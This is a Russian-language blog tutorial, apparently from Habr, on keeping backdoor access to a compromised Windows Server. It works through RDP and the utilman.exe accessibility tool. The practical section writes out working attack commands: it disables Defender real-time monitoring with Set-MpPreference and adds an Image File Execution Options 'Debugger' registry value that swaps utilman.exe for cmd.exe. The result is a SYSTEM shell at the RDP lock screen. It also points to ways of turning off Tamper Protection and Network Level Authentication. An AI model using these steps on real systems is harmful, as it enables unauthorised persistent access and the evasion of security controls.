# Persistence by changing the registry
Привет! Сегодня хотелось бы рассмотреть стандартный, но необычный способ закрепления в системе через RDP, используя utilman.exe.

Представим следующую ситуацию: нам удалось получить reverse shell от целевого хоста. Безусловно, нам необходим backdoor для обеспечения постоянного доступа. В процессе сканирования мы узнаем об открытом 3389 порте. И как нам быть?

#### Немного теории

**RDP (Remote Desktop Protocol)** — это протокол для удаленного подключения к компьютеру или серверу с ОС Windows. С его помощью пользователи могут подключиться к удаленной машине и взаимодействовать с ее рабочим столом так, как если бы они физически находились перед ней. Чаще всего служба RDP используется для администрирования серверов, технической поддержки пользователей и удаленной работы.

**Utilman.exe** — это служебная программа Windows, которая служит для запуска специальных возможностей на экране блокировки (экранный диктор, экранная клавиатура, лупа и т. п.).

**Реестр Windows** - иерархически построенная база данных параметров и настроек в большинстве операционных систем Microsoft Windows. Реестр содержит информацию и настройки для аппаратного обеспечения, программного обеспечения, профилей пользователей, предустановки.

#### Информация о жертве

Сразу хотелось бы отметить, что целевой хост имеет следующую ОС:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/73e/a6c/462/73ea6c46241e7430c2540b567761b5f6.png)

Ключевой особенностью систем Windows Server является отключенное по умолчанию свойство "Tamper Protection", которое обеспечивает дополнительную защиту от изменений ключевых функций безопасности, включая ограничение изменений, которые не вносятся непосредственно через приложение. Другими словами, запрещает другим вмешиваться в важные функции безопасности системы (**запрещает изменение реестра**).

Если данная функция включена, то отключить ее можно разными методами, например: [https://theitbros.com/managing-windows-defender-using-powershell/#:~:text=Tamper%20Protection%20is%20enabled%20in,action%20at%20the%20UAC%20prompt](https://theitbros.com/managing-windows-defender-using-powershell/#:~:text=Tamper%20Protection%20is%20enabled%20in,action%20at%20the%20UAC%20prompt)

Также обязательным условием является выключенный параметр "Require computers to use Network Level Authentication to connect", который запрещает подключаться по RDP без конкретной УЗ. Иными словами, запрет на попадание на экран блокировки

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/1b1/2c0/24b/1b12c024be784042d0471dc2d2904d2d.png)

[Отключение функции](https://www.anyviewer.com/how-to/disable-network-level-authentication-2578.html) "Require computers to use Network Level Authentication to connect".

#### Практический пример

Допустим, мы каким-то чудом смоги получить обратную оболочку от имени Администратора хоста:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/d43/94c/ce7/d4394cce74f1d5815b19a35930309093.png)

Давайте проверим состояние активности антивируса (общий способ):

`sc query WinDefend`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/1be/c79/ef2/1bec79ef25cb00d4df0d531661612f11.png)

Мы видим параметр "NOT_STOPABLE", который говорит нам о том, что защита в реальном времени активна. Выключаем её:

`powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"`

и опять проверим состояние антивируса:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/ec2/87d/6f0/ec287d6f04be12a4bdb16c6b1c48d434.png)

Также можно проверить другим способом:

`powershell -command "(Get-MpPreference).DisableRealtimeMonitoring"`

Если эта команда возвращает значение False, то реальный мониторинг активен. Если True, то выключен.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/2f2/5ef/a1f/2f25efa1fb758e42da9dd934fbff78b0.png)

Действительно, он выключен. Теперь, когда приготовления закончены, перейдем к закреплению:

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/cd8/ec3/783/cd8ec3783d31a4deffe424cbf4f1bb96.png)

_Следующий шаг несет в себе возможную потерю backdoor'a._

Теперь вернем Defender в исходное состояние:

`powershell -command "Set-MpPreference -DisableRealtimeMonitoring $false"`

и сразу проверим:

`powershell -command "(Get-MpPreference).DisableRealtimeMonitoring"`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/6e2/501/f6f/6e2501f6fcd18c1140dcb5f1577d646c.png)

Прекращаем взаимодействие с хостом через обратную оболочку и подключаемся через rdesktop:  
`rdesktop ip`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/e1d/f3b/56e/e1df3b56ecacdcc34b60b7553392d5b0.png)

При первом подключении принимаем сертификаты

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/c4e/7bb/924/c4e7bb9246a15e041c864c9accafebf3.png)

Теперь нам осталось нажать на значок справа внизу или комбинацию клавиш `Win+U`:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/d16/c07/cfa/d16c07cfa4b0cd69bef09f002dd1526d.png)

Успех! Теперь у нас есть backdoor от имени системы.

**Кстати, вы заметили, что мы повысили свои права от Администратора до системы?)**

#### Но почему это так работает?

Если кратко, то некоторые сервисы, службы и т.д. работают в системе с наивысшими правами. В нашем случае, utilman.exe. Изменив в реестре исполняемый файл на cmd.exe, система запускает его, опять же, с наивысшими правами (nt authority\ system)
